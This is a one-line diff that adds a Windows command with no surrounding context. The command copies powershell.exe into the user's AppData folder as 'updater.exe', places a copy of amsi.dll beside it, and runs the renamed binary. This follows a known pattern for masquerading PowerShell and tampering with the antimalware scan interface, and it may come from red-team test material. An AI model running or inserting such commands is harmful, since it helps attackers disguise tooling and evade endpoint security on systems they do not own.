@@ -1,0 +1,1 @@
+copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe && copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll && %APPDATA%\updater.exe -Command exit
